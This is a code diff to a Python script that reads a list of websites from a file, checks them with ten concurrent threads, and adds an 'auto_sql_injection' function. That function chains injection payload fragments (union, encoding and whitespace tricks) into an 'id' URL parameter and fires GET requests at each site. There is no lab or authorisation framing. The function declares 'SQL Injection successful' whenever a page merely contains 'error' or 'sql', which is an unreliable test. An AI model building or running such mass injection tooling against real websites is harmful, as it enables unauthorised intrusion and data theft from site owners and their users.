@@ -31,14 +31,26 @@ def check_website(website):
         print(colored(f"{website} is not reachable", 'red'))
 
 def auto_sql_injection(website):
-    # Implement your SQL injection attack logic here
-    pass
+    # Simulated auto SQL injection process
+    print(colored(f"Performing auto SQL injection on {website}...", 'magenta'))
+    
+    # Here you would implement the actual SQL injection logic
+    # Using the provided SQL injection techniques and payloads
+    
+    # Example:
+    payload = f"{order_start}{w1}{w2}{w3}{w3a}{w4}{w5}{w6}{w7}{w8}{w9}{w10}{union}{union1}{union2}{bof}{bof2}{urlencode}{double_url}{whitespaces}{basic_1}"
+    url = f"{website}?id={payload}"
+    response = requests.get(url)
+    if "error" in response.text.lower() or "sql" in response.text.lower():
+        print(colored(f"SQL Injection successful on {website}", 'green'))
+    else:
+        print(colored(f"SQL Injection failed on {website}", 'red'))
 
 def scan_websites(file_path):
     with open(file_path, 'r') as file:
-        websites = [line.strip() for line in file]
+        websites = [website.strip() for website in file.readlines()]
 
-    with ThreadPoolExecutor() as executor:
+    with ThreadPoolExecutor(max_workers=10) as executor:
         executor.map(check_website, websites)
 
 if __name__ == "__main__":
